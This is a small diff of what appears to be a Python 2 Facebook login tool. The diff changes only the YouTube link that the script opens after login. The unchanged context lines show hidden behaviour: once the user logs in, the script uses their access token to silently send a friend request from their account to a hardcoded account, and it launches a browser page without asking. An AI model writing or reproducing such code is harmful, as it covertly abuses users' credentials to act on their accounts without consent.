@@ -134,7 +134,7 @@ def login():
                 zedd.close()
                 print '\n[#] Login Successfully!!'
                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
-                os.system('xdg-open https://www.youtube.com/kaitolegion')
+                os.system('xdg-open https://www.youtube.com/tNZmkKN3ikM')
                 time.sleep(1)
                 menu()
             except requests.exceptions.ConnectionError:
